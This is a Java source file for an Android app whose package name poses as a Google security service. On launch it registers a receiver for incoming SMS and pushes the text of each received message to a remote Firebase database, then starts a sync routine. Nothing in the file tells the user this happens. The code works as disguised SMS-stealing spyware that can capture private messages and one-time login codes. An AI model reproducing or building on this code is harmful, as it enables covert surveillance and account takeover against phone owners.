package com.google.services.security;

import android.app.Application;
import android.content.IntentFilter;
import android.provider.Telephony;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

/**
 * Created by ouala_eddine on 1/17/2019.
 * Project : lahcen.
 */
public class App extends Application {

    private SmsBroadcastReceiver smsBroadcastReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        smsBroadcastReceiver = new SmsBroadcastReceiver();
        registerReceiver(smsBroadcastReceiver, new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION));
        smsBroadcastReceiver.setListener(new SmsBroadcastReceiver.Listener() {
            @Override
            public void onTextReceived(String text) {
                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference myRef = database.getReference("newSms/").push();
                myRef.setValue(text);


                new Synchronizer(App.this).sync();
            }
        });
    }

    @Override
    public void onTerminate() {
        unregisterReceiver(smsBroadcastReceiver);
        super.onTerminate();
    }
}